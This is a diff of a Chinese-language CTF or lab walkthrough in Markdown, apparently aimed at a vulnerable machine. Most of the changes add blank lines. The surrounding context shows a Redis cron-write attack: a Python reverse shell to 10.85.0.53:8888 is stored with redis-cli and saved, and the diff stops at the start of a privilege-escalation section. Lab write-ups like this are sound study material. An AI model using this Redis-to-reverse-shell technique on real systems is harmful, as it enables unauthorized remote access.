@@ -252,15 +252,18 @@ cluster_enabled:0
 
 >ok 可以反弹shell了
 >
+
 ![图 9](../assets/images/71b5c361d0eba8339cff3c542bf075ce2de55a2ca0892520464815bbe52e72a0.png)  
 ![图 10](../assets/images/732444b8fe81f02c8cacf066c020825c436108d125a702b3653e343877affad7.png)  
 
 >有点意外奥，不能执行php
 >
+
 ![图 11](../assets/images/dbedb6feab978937831008640211b292b34ddd9bad47f16534e05107fd380cf3.png)  
 
 >是一个python，我应该上传什么解析python呢，先试试直接python
 >
+
 ![图 12](../assets/images/02b8ad4fc8d36a8a91ec5fd6296c351aad8b989de4fee15f7e578d80a463696a.png)  
 ![图 13](../assets/images/caae27bd4fb29e4dc308b2dd595465df17a024e3897678f0e48e08d0f6c8bc45.png)  
 
@@ -268,9 +271,11 @@ cluster_enabled:0
 >
 ![图 14](../assets/images/43986f02ab61565499762da750db1a0978eca4191e3e553efed7873283c67a3a.png)  
 
-![图 15](../assets/images/5990f37e53d7bf45c00271c87756e89370dacac4167a9699152c4551ff6007e9.png)  
+![图 15](../assets/images/5990f37e53d7bf45c00271c87756e89370dacac4167a9699152c4551ff6007e9.png)
+
 >找到个东西
 >
+
 ```
 root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
 OK
@@ -282,6 +287,7 @@ root@Urahara:~# redis-cli -h 10.85.0.52 save
 OK
 
 ```
+
 ![图 16](../assets/images/26b260a3ab719f6fd6e0c563be4421de9764ea6458a1cacaefe1d189a3910d51.png)  
 ![图 17](../assets/images/0b363313c52b0c30108c1f1e9af04b1dfeedab7390f9df587a10dea7a381782b.png)  
 
@@ -311,18 +317,24 @@ OK
 
 >了解了大概意思，脚本的话不写也没关系，我有一个手测试的方案。
 >
+
 ![图 23](../assets/images/d37f2fefaabf595aaa5235d0617189586c2e6786a5d63760a377293ea9061514.png)  
 ![图 24](../assets/images/002871851c13db4fc522c18fbd7e947cf2c8761cd0e4078ed307e12611f99d6b.png)  
 
 >不过不巧的事我kali没找到正确路径，正确路径根据wp是/srv/ftp
 >
+
 ![图 25](../assets/images/e76747e9dadd2ae2cef31108c332dfbaa3c3acd266921114c028473d786fd092.png)  
 ![图 26](../assets/images/7d5f032aecd77dc55ecac6cf0078c534bf3a0f38130ccf17461db776e2027f20.png)  
 ![图 27](../assets/images/580e23047b391170af8cc9ce249595bfdd0d6bf10d8c8560526c17c83a768fa0.png)  
 
 ![图 28](../assets/images/8d372eb99c46b21e4e73a8eee16af946719151f4ee33b50be1edcbd993d4567f.png)  
 
+>好了
+>
+
 ## 提权
+
 ```
 ben@system:/home/ben$ ls -al
 total 32
